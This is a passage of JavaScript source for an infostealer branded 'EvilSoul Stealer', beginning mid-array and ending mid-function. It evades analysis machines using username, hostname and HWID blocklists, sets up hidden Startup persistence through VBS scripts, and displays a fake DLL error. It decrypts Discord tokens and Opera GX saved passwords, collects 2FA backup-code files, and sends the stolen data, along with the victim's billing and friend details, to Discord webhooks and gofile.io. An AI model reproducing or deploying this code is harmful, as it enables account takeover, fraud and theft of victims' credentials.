"D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB", "D5DD3342-46B5-298A-2E81-5CA6867168BE", "D7382042-00A0-A6F0-1E51-FD1BBF06CD71", "D7958D98-A51E-4B34-8C51-547A6C2E6615", "D8C30328-1B06-4611-8E3C-E433F4F9794E", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D", "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F", "DD45F600-3C63-11EA-8000-3CECEF440156", "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C", "DEAEB8CE-A573-9F48-BD40-62ED6C223F20", "E08DE9AA-C704-4261-B32D-57B2A3993518", "E0C806ED-B25A-4744-AD7D-59771187122E", "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5", "E2342042-A1F8-3DCF-0182-0E63D607BCC7", "E3BB3342-02A8-5613-9C92-3747616194FD", "E57F6333-A2AC-4F65-B442-20E928C0A625", "E67640B3-2B34-4D7F-BD62-59A1822DDBDC", "E6DBCCDF-5082-4479-B61A-6990D92ACC5F", "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A", "EADD1742-4807-00A0-F92E-CCD933E9D8C1", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "F3EA4E00-3C5F-11EA-8000-3CECEF440016", "F5744000-3C78-11EA-8000-3CECEF43FEFE", "F5BB1742-D36D-A11E-6580-2EA2427B0038", "F5EFEEAC-96A0-11EB-8365-FAFE299935A9", "F68B2042-E3A7-2ADA-ADBC-A6274307A317", "F705420F-0BB3-4688-B75C-6CD1352CABA9", "F91C9458-6656-4E83-B84A-13641DE92949", "F9E41000-3B35-11EA-8000-3CECEF440150", "FA612E42-DC79-4F91-CA17-1538AD635C95", "FA8C2042-205D-13B0-FCB5-C5CC55577A35", "FBC62042-5DE9-16AD-3F27-F818E5F68DD3", "FC40ACF8-DD97-4590-B605-83B595B0C4BA", "FCE23342-91F1-EAFC-BA97-5AAE4509E173", "FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "FED63342-E0D6-C669-D53F-253D696D74DA", "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39", "D7AC2042-05F8-0037-54A6-38387D00B767", "52562042-B33F-C9D3-0149-241F40A0F5D8", "3E9AC505-812A-456F-A9E6-C7426582500E", "11E12042-2404-040A-31E4-27374099F748", "6E963342-B9C8-2D14-B057-C60C35722AD4", "9EB0FAF6-0713-4576-BD64-813DEE9E477E", "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9", "89E32042-1B2B-5C76-E966-D4E363846FD4", "699400A5-AFC6-427A-A56F-CE63D3E121CB", "2F230ED7-5797-4DB2-BAA0-99A193503E4B"]
var pcuserblack = ["05h00Gi0", "dreed", "eduardcarp", "skelly", "Frank", "3u2v9m8", "43By4", "seajones", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby", "Amy", "AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6", "DefaultAccount", "dOuyo8RV71", "DVrzi", "e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GjBsjb", "Guest", "h7dk1xPr", "h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF", "j6SHA37KA", "j7pNjWM", "John", "jude", "Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR", "lmVwjj9b", "Louise", "Lucas", "mike", "Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf", "server", "SqgFOf3G", "Steve", "test", "TVM", "txWas1m2t", "umyUJ", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy", "fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK", "rB5BnfuR2", "GexwjQdjXG", "IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J", "BXw7q", "lubi53aN14cU", "5Y3y73", "9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu", "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T", "sal.rosenburg"];
var hostnameblack = ["373836", "Wallachebciw", "JANWIL", "Tarynorqc", "MARWAL", "HANBRO", "DESKTOP-D019GDM", "Lynnetlyel", "Zoefflz", "Hindajiox", "Opalubci", "ACOLEM", "Zoefflz", "DESKTOP-EIWAI7B", "Franciscooffc", "Luannawivg", "Annabelaooou", "Adriannaboth", "Gladmrde", "MICHEDUNCA", "Adriaensgtgh", "Nadeanzlda", "DESKTOP-D019GDM", "Gustyvogv", "Frankyrhni", "Gavinnxsr", "DESKTOP-EIWAI7B", "JUANRAMIRE", "Anallisegbpl", "DESKTOP-0000000", "Valenegrwl", "Sandextpm", "00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WORK", "XC64ZB", "XGNSVODU", "ZELJAVA", "3CECEFC83806", "C81F66C83805", "DESKTOP-USLVD7G", "DESKTOP-AUPFKSY", "DESKTOP-RP4FIBL", "DESKTOP-6UJBD2J", "DESKTOP-LTMCKLA", "DESKTOP-FLTWYYU", "DESKTOP-WA2BY3L", "DESKTOP-UBDJJ0A", "DESKTOP-KXP5YFO", "DESKTOP-DAU8GJ2", "DESKTOP-FCRB3FM", "DESKTOP-VYRNO7M", "DESKTOP-PKQNDSR", "DESKTOP-SCNDJWE", "DESKTOP-RSNLFZS", "DESKTOP-MWFRVKH", "DESKTOP-QLN2VUF", "DESKTOP-62YPFIQ", "DESKTOP-PA0FNV5", "DESKTOP-B9OARKC", "DESKTOP-J5XGGXR", "DESKTOP-JHUHOTB", "DESKTOP-64ACUCH", "DESKTOP-SUNDMI5", "DESKTOP-GCN6MIO", "FERREIRA-W10", "DESKTOP-MJC6500", "DESKTOP-WS7PPR2", "DESKTOP-XWQ5FUV", "DESKTOP-UHHSY4R", "DESKTOP-ZJRWGX5", "DESKTOP-ZYQYSRD", "WINZDS-MILOBM35", "DESKTOP-K8Y2SAM", "DESKTOP-4GCZVJU", "DESKTOP-O6FBMF7", "DESKTOP-WDT1SL6", "EIEEIFYE", "CRYPTODEV222222", "EFA0FDEC-8FA7-4"];

const userBlacklisted = pcuserblack.includes(os.userInfo().username);
const hostBlacklisted = hostnameblack.includes(os.hostname());
const hwidBlacklisted = hwidblack.includes(hwid);

const isBlacklisted = userBlacklisted || hostBlacklisted || hwidBlacklisted;

if (isBlacklisted) {
  process.exit(0);
}


function Random(length) {
  let result = "";
  const characters = "0123456789";
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function DirectoryExistence(path) {
  if (!fs.existsSync(path)) {
    fs.mkdirSync(path, { recursive: true });
  }
}

function FileEncoding(content) {
  console.log(content.slice(0, 16).toString("hex"));
}


function ZipDirectory(source, out) {
  const archive = archiver("zip", { zlib: { level: 9 } });
  const stream = fs.createWriteStream(out);
  return new Promise((resolve, reject) => {
    archive.directory(source, false).on("error", (err) => reject(err)).pipe(stream);
    stream.on("close", () => resolve());
    archive.finalize();
  });
}


async function Sleep(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function Bytes(a, b) {
  let c = 1024;
  let d = b || 2;
  let e = [" B", " KB", " MB", " GB", " TB"];
  let f = Math.floor(Math.log(a) / Math.log(c));
  return parseFloat((a / Math.pow(c, f)).toFixed(d)) + "" + e[f];
}

async function SendLogs(type, ...args) {
  const data = {
    username: `Evilsoul / ${config.key}`,
    avatar_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg",
  };

  const message = args
    .map(a => (typeof a === "string" ? a : JSON.stringify(a, null, 2)))
    .join(" ");

  try {
    if (message.length > 1500) {
      let parts = message.match(/.{1,1500}/gs);
      for (const part of parts) {
        await axios.post(config.errors, { ...data, content: `[${type.toUpperCase()}] ${part}` });
      }
    } else {
      await axios.post(config.errors, { ...data, content: `[${type.toUpperCase()}] ${message}` });
    }
  } catch (err) {
  }
}

["log", "exclusion", "debug", "limpeza", "warn", "error"].forEach(method => {
  const original = console[method];
  console[method] = async (...args) => {
    original.apply(console, args);
    await SendLogs(method, ...args);
  };
});



async function Startup() {
  try {

    const startupDir = path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
    const exePath = process.execPath;
    const exeLnkPath = path.join(startupDir, `${path.basename(exePath, ".exe")}.lnk`);

    const exeLnkScript = `
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "${exeLnkPath.replace(/\\/g, "\\\\")}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "${exePath.replace(/\\/g, "\\\\")}"
oLink.WorkingDirectory = "${path.dirname(exePath).replace(/\\/g, "\\\\")}"
oLink.WindowStyle = 1
oLink.IconLocation = "${exePath.replace(/\\/g, "\\\\")},0"
oLink.Save
`;

    const tempVbs = path.join(os.tmpdir(), "sysZxammz256.vbs");
    fs.writeFileSync(tempVbs, exeLnkScript, "utf16le");
    execSync(`cscript //nologo "${tempVbs}"`);
    fs.unlinkSync(tempVbs);

    const watcherVbs = `
Set fso = CreateObject("Scripting.FileSystemObject")
Set oWS = CreateObject("WScript.Shell")
shortcutPath = "${exeLnkPath.replace(/\\/g, "\\\\")}"
targetExe = "${exePath.replace(/\\/g, "\\\\")}"
Do
  If Not fso.FileExists(shortcutPath) Then
    Set oLink = oWS.CreateShortcut(shortcutPath)
    oLink.TargetPath = targetExe
    oLink.WorkingDirectory = fso.GetParentFolderName(targetExe)
    oLink.WindowStyle = 1
    oLink.IconLocation = targetExe & ",0"
    oLink.Save
  End If
  WScript.Sleep 5000
Loop
`;

    const watcherPath = path.join(os.tmpdir(), "lib32winmz256.vbs");
    fs.writeFileSync(watcherPath, watcherVbs, "utf16le");

    const watcherLnkPath = path.join(startupDir, "watcherZxammz256.lnk");
    const watcherLnkScript = `
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "${watcherLnkPath.replace(/\\/g, "\\\\")}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "wscript.exe"
oLink.Arguments = """${watcherPath.replace(/\\/g, "\\\\")}"""
oLink.WorkingDirectory = "${path.dirname(watcherPath).replace(/\\/g, "\\\\")}"
oLink.WindowStyle = 0
oLink.IconLocation = "wscript.exe,0"
oLink.Save
`;

    const tempWatcherVbs = path.join(os.tmpdir(), "winJaxmalz0.vbs");
    fs.writeFileSync(tempWatcherVbs, watcherLnkScript, "utf16le");
    execSync(`cscript //nologo "${tempWatcherVbs}"`);
    fs.unlinkSync(tempWatcherVbs);

    spawn("wscript.exe", [watcherPath], {
      detached: true,
      stdio: "ignore",
    }).unref();

    return true;
  } catch (err) {
    console.error("Startup Function Error:", err.message);
    return false;
  }
}

async function FakeError() {
  try {
    const errors = [
      { code: "0x8007007E", message: "The specified module could not be found.", dll: "kernel32.dll" },
    ];

    for (let error of errors) {
      const content = `Set objShell = WScript.CreateObject("WScript.Shell")\nobjShell.Popup "Error Code: ${error.code} - Message: ${error.message} - DLL: ${error.dll}", 5, "DLL Error", 48`;
      const temp = path.join(os.tmpdir(), `${Random(10)}.vbs`);
      fs.writeFileSync(temp, content);
      execSync(`cscript //Nologo "${temp}"`);
      fs.unlinkSync(temp);
    }
  } catch { }
}

async function Upload(filePath, maxRetries = 5, retryDelay = 3000) {
  const fileSize = fs.statSync(filePath).size;
  const fileName = path.basename(filePath);
  let attempt = 0;
  let lastError = null;

  while (attempt < maxRetries) {
    try {
      const formData = new FormData();
      formData.append("file", fs.createReadStream(filePath));

      await axios.post(config.errors, {
        content: `-# <a:atived:1253258383881011231> Iniciando upload de **[${fileName}]** (tentativa ${attempt + 1}/${maxRetries})`
      });

      const response = await axios.post(
        "https://store8.gofile.io/uploadFile",
        formData,
        {
          headers: formData.getHeaders(),
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
          timeout: 120000
        }
      );

      if (response?.data?.status === "ok") {
        await axios.post(config.errors, {
          content: `-# <a:atived:1253258383881011231> [INFO] Upload de **[${fileName}]** concluído: **[${fileName}](${response.data.data.downloadPage})**`
        });
        return response.data.data.downloadPage;
      } else {
        throw new Error(`-# <a:desatived:1253258842528157796> [ERROR] Upload falhou: ${JSON.stringify(response.data)}`);
      }

    } catch (err) {
      lastError = err;
      const errMsg = err.message || String(err);

      await axios.post(config.errors, {
        content: `-# <a:desatived:1253258842528157796> [WARN] Falha no upload (tentativa ${attempt + 1}): ${errMsg}`
      });

      if (
        err.code === "ECONNRESET" ||
        errMsg.includes("socket hang up") ||
        err.code === "ETIMEDOUT"
      ) {
        attempt++;
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, retryDelay));
          continue;
        }
      }

      break;
    }
  }

  try {
    logs += `-# <a:desatived:1253258842528157796> [ERROR] Upload falhou. Último erro: ${lastError}\nUsername PC: ${os.userInfo().username}\n`;

    const errorForm = new FormData();
    errorForm.append("file", fs.createReadStream(filePath));

    await axios.post(config.errors, {
      content: `-# <a:desatived:1253258842528157796> [ERROR] Upload falhou. Enviando arquivo via backup...`
    });

    await axios.post(config.webhook, errorForm, {
      headers: errorForm.getHeaders()
    });

    await axios.post(config.errors, {
      content: `-# [INFO] Backup enviado com sucesso.`
    });

  } catch (backupErr) {
    await axios.post(config.errors, {
      content: `-# [ERROR] Falha também no envio de backup: ${backupErr.message}`
    });
  }

  return null;
}

async function Encrypted() {
  try {
    for (let i = 0; i < browsers_path.length; i++) {
      const pathState = browsers_path[i][2] + "Local State";
      if (!fs.existsSync(browsers_path[i][0])) continue;
      try {
        const data = fs.readFileSync(pathState);
        const base64 = JSON.parse(data).os_crypt.encrypted_key;
        const buffer = Buffer.from(base64, "base64").slice(5);
        const array = Array.from(buffer);
        const output = execSync("powershell.exe Add-Type -AssemblyName System.Security; " + "[System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(" + array.join(",") + "), $null, 'CurrentUser')").toString().split("\r\n").filter((line) => line !== "");
        const key = Buffer.from(output);
        browsers_path[i].push(key);
      } catch { }
    }
  } catch { }
}

async function FindToken(path, name) {
  const fimiguerrero = path;
  path += "Local Storage\\leveldb";
  if (!fimiguerrero.includes("discord")) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs.readFileSync(path + "\\" + file, "utf8").split(/\r?\n/).forEach((line) => {
            const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
            for (const pattern of patterns) {
              const found = line.match(pattern);
              if (found && found.length)
                found.forEach((token) => {
                  if (!tokens.find((t) => t.token === token)) tokens.push({ token, location: name });
                });
            }
          });
      });
    } catch (err) { }
  } else {
    if (!fs.existsSync(fimiguerrero + "\\Local State")) return;
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs.readFileSync(path + "\\" + file, "utf8").split(/\r?\n/).forEach((line) => {
            const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g);
            const found = line.match(pattern);
            if (found) {
              found.forEach((token) => {
                try {
                  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(fimiguerrero + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
                  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
                  token = Buffer.from(token.split("dQw4w9WgXcQ:")[1], "base64");
                  const start = token.slice(3, 15);
                  const middle = token.slice(15, token.length - 16);
                  const end = token.slice(token.length - 16, token.length);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                  decipher.setAuthTag(end);
                  const final = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                  if (!tokens.find((t) => t.token === final)) tokens.push({ token: final, location: name });
                } catch (err) { }
              });
            }
          });
      });
    } catch (err) { }
  }
}

async function GetToken() {
  await Promise.all(paths.map(p => FindToken(p.path, p.name)));
  await Promise.all(tokens.map(async (result) => {
    let data;
    try {
      const response = await axios.get("https://discord.com/api/v9/users/@me", {
        headers: { "Content-Type": "application/json",   authorization: result.token,
        },
      });
      data = response.data;
    } catch (e) {
      return;
    }

    const [ip, billing, friends, badges] = await Promise.all([
      GetIp(),
      GetBilling(result.token).catch(() => "`No Billing`"),
      GetFriends(result.token),
      GetBadges(data.id, result.token).catch(() => "`No Badges`"),
    ]);

    const Geass = `-# 👤 User Information: **${data.username} (${data.id})**`;
    const fodase = `-# 🕵️‍♂️ Directory Found: **${result.location}**\n${Geass}`;

    const payload = {
      avatar_url: "https://i.ibb.co/C3pnNj2S/77b4f3b9-720c-4c7a-8b6b-102635726cc9.jpg",
      username: "EvilSoul",
      embeds: [
        {
          description: fodase,
          footer: { text: `@evilsoulstealer | ${config.key}` },
          fields: [
            { name: `:closed_lock_with_key: Token:`, value: `\`\`\`fix\n${result.token}\`\`\``, inline: false },
            { name: `:gem: Badges:`, value: badges || "`No Badges`", inline: true },
            { name: `:credit_card: Billing:`, value: billing || "`No Billing`", inline: true },
            { name: `:key: 2FA Enable:`, value: `\`${data.mfa_enabled ? "Enable" : "No Enable"}\``, inline: true },
            { name: `:e_mail: Email:`, value: `\`${data.email || "None"}\``, inline: true },
            { name: `:mobile_phone: Phone:`, value: `\`${data.phone || "None"}\``, inline: true },
            { name: `:globe_with_meridians: IP Address:`, value: `\`${ip || "Unavailable"}\``, inline: true },
          ],
          color: 0x2b2d31,
          author: { name: `EvilSoul Stealer - (Discord ~ ${os.userInfo().username})`, icon_url: "https://i.ibb.co/C3pnNj2S/77b4f3b9-720c-4c7a-8b6b-102635726cc9.jpg" },
          thumbnail: { url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png` },
        },
        {
          color: 0x2b2d31,
          description: friends?.users || "`No Friends`",
          author: { name: `HQ Friends (${friends?.length || 0})`, icon_url: "https://i.ibb.co/C3pnNj2S/77b4f3b9-720c-4c7a-8b6b-102635726cc9.jpg", },
        },
      ],
    };

    await Promise.allSettled([
  axios.post(config.webhook, payload)
    .then(() => console.log(`[DISCORD] Discord Tokens Enviados com Sucesso para a Key: ${config.key}`))
    .catch(() => { }),
    ]);
  }));
}

async function GetIp() {
  const ip = await axios.get("https://www.myexternalip.com/raw").catch(() => null);
  return ip?.data || "None";
}

function GetRareBadges(flags) {
  if (typeof flags !== "number") return "";
  let result = "";
  for (const id in badges) {
    const badge = badges[id];
    if ((flags & badge.id) === badge.id && badge.rare) {
      result += badge.emoji;
    }
  }
  return result;
}

async function CurrentNitro(since) {
  if (!since) {
    return { badge: null, current: null };
  }

  const cd = new Date();
  const sd = new Date(since);
  const year = cd.getFullYear() - sd.getFullYear();
  const month = cd.getMonth() - sd.getMonth();
  let passed = year * 12 + month;
  if (cd.getDate() < sd.getDate()) {
    passed -= 1;
  }

  const nitros = [
    { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
    { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
    { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
    { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
    { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
    { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
    { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
    { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
    { badge: "nitro_opal", lowerLimit: 72 },
  ];

  const current = nitros.find((badge) => {
    const inll = passed >= badge.lowerLimit;
    const inul = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
    return inll && inul;
  });

  return { badge: current?.badge || null, current: since };
}

async function GetBadges(id, token) {
  const data = await axios.get(`https://discord.com/api/v10/users/${id}/profile`, {
    headers: {
      "Content-Type": "application/json",
      authorization: token,
    },
  }).then((response) => response.data).catch(() => null);
  if (!data || !Array.isArray(data.badges)) return "`None`";
  if (!data.badges.length) return "`No Badges`";

  const flags = data.badges.map((badge) => badge.id);
  const nitro = await CurrentNitro(data.premium_since);
  if (nitro.badge) {
    flags.unshift(nitro.badge);
  }

  return flags.length ? flags.map((id) => badges[id]?.emoji).filter(Boolean).join("") : "`No Badges`";
}

async function GetBilling(token) {
  const data = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
    headers: {
      "Content-Type": "application/json",
      authorization: token,
    },
  }).then((response) => response.data).catch(() => null);
  if (!data || !Array.isArray(data)) return "`None`";
  if (!data.length) return "`No Billing`";

  let billings = "";
  for (const billing of data) {
    if (billing.type == 2 && billing.invalid != !0) {
      billings += "<:paypal:1367518269719969873>";
    } else if (billing.type == 1 && billing.invalid != !0) {
      billings += "<:card:1367518257241915483>";
    }
  }

  return billings || "`No Billing`";
}

async function GetFriends(token) {
  const data = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
    headers: {
      authorization: token,
    },
  }).then((response) => response.data).catch(() => null);
  if (!data || !Array.isArray(data)) return "*Account Locked*";
  if (!data.length) return "*No Rare Friends*";

  const friends = data.filter((user) => user.type == 1);
  let result = "";
  for (const friend of friends) {
    const badges = GetRareBadges(friend.user.public_flags);
    const friend3c = friend.user.username.length === 3;
    const badge3c = friend3c ? "<:3c:1365004856103796897>" : "";
    if (badges) {
      result += `${badge3c}${badges} | \`${friend.user.username}\`\n`;
    } else if (friend3c) {
      result += `${badge3c} | \`${friend.user.username}\`\n`;
    }
  }

  return {
    length: friends.length,
    users: result || "*No Rare Friends*",
  };
}

async function GetGuilds(token) {
  try {
    const data = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    }).then((response) => response.data).catch(() => null);
    const guilds = data.filter((guild) => guild.owner === true || guild.permissions === 562949953421311);
    if (guilds.length === 0) {
      return "*Nothing to see here!*";
    }

    let result = "\n";
    for (const guild of guilds) {
      const role = guild.owner ? "<:starzap:1376338577268412486>" : "🛠️";
      result += `${role} | \`${guild.name} - Members: ${guild.approximate_member_count}\`\n`;
      if (result.length >= 1024) {
        return "`Too many servers to display.`";
      }
    }

    return result;
  } catch (err) { }
}


async function GetBackupCode() {
  const homedir = os.homedir();
  const onedrive = process.env.OneDrive || homedir + "\\OneDrive";
  const dirs = ["Pictures", "Videos", "Music", "Documents", "Desktop", "Downloads", onedrive];
  let result = "";

  const patterns = [
    "discord_backup_codes",
    "github-recovery-codes",
    "google-backup-codes",
    "Epic Games Account Two-Factor backup codes"
  ];

  for (const dir of dirs) {
    const full = homedir + "\\" + dir;
    if (fs.existsSync(full)) {
      fs.readdirSync(full).forEach((file) => {
        if (patterns.some((pattern) => file.includes(pattern)) && file.endsWith(".txt")) {
          const dir = full + "\\" + file;
          result += `\n\nBACKUP CODES FROM: ${dir}`;
          result += `\n\n${fs.readFileSync(dir, "utf-8")}`;
        }
      });
    }
  }

  if (result) {
    const output = `${process.env.TEMP}\\${identifier}\\backup_codes.txt`;
    if (!fs.existsSync(output)) {
      fs.mkdirSync(output, { recursive: true });
    }

    fs.writeFileSync(output, result.slice(2));
  }
}

function decryptPassword(encryptedBuffer, key) {
  try {
    const iv = encryptedBuffer.slice(3, 15);
    const data = encryptedBuffer.slice(15, encryptedBuffer.length - 16);
    const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);

    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);

    const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
    return decrypted.toString("utf8");
  } catch (err) {
    console.error("[ERROR] Failed to decrypt password:", err.message);
    return null;
  }
}

async function tryRemoveFile(filePath) {
  for (let i = 0; i < 5; i++) {
    try {
      fs.unlinkSync(filePath);
      return;
    } catch (err) {
      if (err.code === "EBUSY") await Sleep(1000);
      else return;
    }
  }
}

async function extractPasswords(dbPath, masterKey) {
  const passwords = [];
  const tempCopy = path.join(os.tmpdir(), `opera_login_${Date.now()}.db`);

  try {
    fs.copyFileSync(dbPath, tempCopy);
  } catch (err) {
    return passwords;
  }

  return new Promise((resolve) => {
    const db = new sqlite3.Database(tempCopy, sqlite3.OPEN_READONLY, (err) => {
      if (err) return resolve(passwords);

      const query = `SELECT origin_url, username_value, password_value FROM logins`;

      db.all(query, [], async (err, rows) => {
        if (!err && rows) {
          for (const row of rows) {
            const decrypted = decryptPassword(row.password_value, masterKey);
            if (decrypted) {
              passwords.push(`[PASSWORD] ${row.origin_url} | ${row.username_value} | ${decrypted}`);
            }
          }
        }
        db.close();
        await tryRemoveFile(tempCopy);
        resolve(passwords);
      });
    });
  });
}

async function operaPasswords() {
  try {
    const operaPath = path.join(process.env.APPDATA, "Opera Software", "Opera GX Stable");
    const operaExe = path.join(process.env.LOCALAPPDATA, "Programs", "Opera GX", "opera.exe");

    if (!fs.existsSync(operaPath) || !fs.existsSync(operaExe)) return;

    const statePath = path.join(operaPath, "Local State");
    if (!fs.existsSync(statePath)) return;

